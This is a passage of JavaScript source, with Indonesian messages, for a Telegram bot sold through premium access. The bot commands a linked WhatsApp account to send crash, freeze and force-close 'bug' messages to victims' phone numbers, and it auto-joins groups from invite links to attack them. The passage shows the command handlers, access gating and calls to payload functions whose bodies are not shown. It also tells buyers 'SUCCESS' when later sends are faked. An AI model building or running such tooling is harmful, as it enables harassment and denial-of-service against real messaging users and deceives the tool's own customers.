    if (!isCmdActive("/xbugs")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xbugs.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }
    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountB.get(target) || 0;
    targetCycleCountB.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} INVISIBLE DELAY × FREZE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : INVISIBLE DELAY × FREZE
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "success",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsB.has(target)) return;
    processingTargetsB.add(target);

    // ===== LOG CLEAN =====
    console.log(`\x1b[36m[PROSES SEND BUG]\x1b[0m -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp7(target)
      .then(() => {
        connectionFailCountB.delete(target);
        notifiedConnectionClosedB.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountB.get(target) || 0;
          fail++;
          connectionFailCountB.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedB.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
        // ❌ error lain silent
      })
      .finally(() => {
        processingTargetsB.delete(target);
        targetCycleCountB.delete(target);

        if (notifiedConnectionClosedB.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsC = new Set();
const targetCycleCountC = new Map();
const connectionFailCountC = new Map();
const notifiedConnectionClosedC = new Set(); // global
let senderDeadNotifiedC = false;

bot.onText(/\/NocteX(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /NocteX 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /NocteX 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5888806062995282044", // 🙂
    };

    const e1 = prem("6010096364636085882", "🎁");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedC = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/noctex")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /noctex.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }
    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountC.get(target) || 0;
    targetCycleCountC.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE IPHONE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose Iphone
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsC.has(target)) return;
    processingTargetsC.add(target);

    // ===== LOG CLEAN =====
    console.log(`\x1b[36m[PROSES SEND BUG]\x1b[0m -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp8(target)
      .then(() => {
        connectionFailCountC.delete(target);
        notifiedConnectionClosedC.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountC.get(target) || 0;
          fail++;
          connectionFailCountC.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedC.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
        // ❌ error lain silent
      })
      .finally(() => {
        processingTargetsC.delete(target);
        targetCycleCountC.delete(target);

        // ===== GLOBAL NOTIF =====
        if (notifiedConnectionClosedC.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsQ = new Set();
const targetCycleCountQ = new Map();
const connectionFailCountQ = new Map();
const notifiedConnectionClosedQ = new Set(); // global
let senderDeadNotifiedQ = false;

bot.onText(/\/QexoN(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /QexoN 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /QexoN 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5890876692498488000", // ❤️
    };

    const e1 = prem("5424942942122964312", "🧢");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedQ = false;
    
    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/qexon")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /qexon.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }
   // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountQ.get(target) || 0;
    targetCycleCountQ.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE IPHONE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose Iphone
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "primary",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsQ.has(target)) return;
    processingTargetsQ.add(target);

    // ===== LOG CLEAN =====
    console.log(`\x1b[36m[PROSES SEND BUG]\x1b[0m -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp9(target)
      .then(() => {
        connectionFailCountQ.delete(target);
        notifiedConnectionClosedQ.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountQ.get(target) || 0;
          fail++;
          connectionFailCountQ.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedQ.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
        // ❌ error lain silent
      })
      .finally(() => {
        processingTargetsQ.delete(target);
        targetCycleCountQ.delete(target);

        // ===== GLOBAL NOTIF =====
        if (notifiedConnectionClosedQ.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});

// ===== BOT COMMAND =====
const processingTargetsForclose = new Set();
const connectionFailCountForclose = new Map();
const targetCycleCountForclose = new Map();
const notifiedConnectionClosedForclose = new Set(); // global
let senderDeadNotifiedForclose = false;

bot.onText(/\/foreclx(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /foreclx 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /foreclx 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5992173732397848888",
    };

    const e1 = prem("6100553439656284469", "😌");

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    senderDeadNotifiedForclose = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/foreclx")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /foreclx.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }

    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!
Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!
🔒 Kamu wajib join semua link di bawah terlebih dahulu.
✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    let count = targetCycleCountForclose.get(target) || 0;
    targetCycleCountForclose.set(target, count + 1);
    const isRealSend = count < 3;

    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE × INVIS</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose No Click Invis
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "success",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    if (!isRealSend) return;

    if (processingTargetsForclose.has(target)) return;
    processingTargetsForclose.add(target);

    await raraaimupp10(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountForclose.get(target) || 0;
          fail++;
          connectionFailCountForclose.set(target, fail);

          if (fail >= 2) {
            notifiedConnectionClosedForclose.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsForclose.delete(target);
        targetCycleCountForclose.delete(target);

        if (notifiedConnectionClosedForclose.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});

// # CASE BUG GROUP SCARRY DEATH # \\
bot.onText(/\/blankgc$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "Example: /blankgc https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
const groupSendTracker = new Map();

bot.onText(/\/blankgc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");
  const a1 = prem("5417913674092277565", "👻");
const a2 = prem("5256131095094652290", "🔥");
const a3 = prem("5217880283860194582", "👻"); 
  
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (!isCmdActive("/blankgc")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /blankgc.");
}
  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes('/blankgroup')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /blankgc https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
    err.includes("already") ||
    err.includes("member") ||
    err.includes("exists") ||
    err.includes("conflict")
) {

        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;
    const messageText = `
<blockquote>
${e1} BLANK CLICK IN GROUP

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Success Send Bugs
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐄𝐊 𝐆𝐑𝐎𝐔𝐏ᯤ",
              url: rawParam,
              style: "success",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

    if (isRealSend) {
      murbugraa1(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

bot.onText(/\/frezegc$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "Example: /frezegc https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
bot.onText(/\/frezegc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");
  const a1 = prem("5417913674092277565", "👻");
const a2 = prem("5256131095094652290", "🔥");
const a3 = prem("5217880283860194582", "👻"); 
                
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isCmdActive("/frezegc")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /frezegc.");
}
  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes('/blankgroup')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /frezegc https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
    err.includes("already") ||
    err.includes("member") ||
    err.includes("exists") ||
    err.includes("conflict")
) {

        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;

    const messageText = `
<blockquote>
${e1} FREZE INVISIBLE IN GROUP

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Success Send Bugs
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐄𝐊 𝐆𝐑𝐎𝐔𝐏ᯤ",
              url: rawParam,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

    if (isRealSend) {
      murbugraa2(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

bot.onText(/\/fcgc$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "Example: /fcgc https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
bot.onText(/\/fcgc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");
  const a1 = prem("5417913674092277565", "👻");
const a2 = prem("5256131095094652290", "🔥");
const a3 = prem("5217880283860194582", "👻"); 
                
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isCmdActive("/fcgc")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /fcgc.");
}
  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes('/fcgc')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /fcgc https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
    err.includes("already") ||
    err.includes("member") ||
    err.includes("exists") ||
    err.includes("conflict")
) {

        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

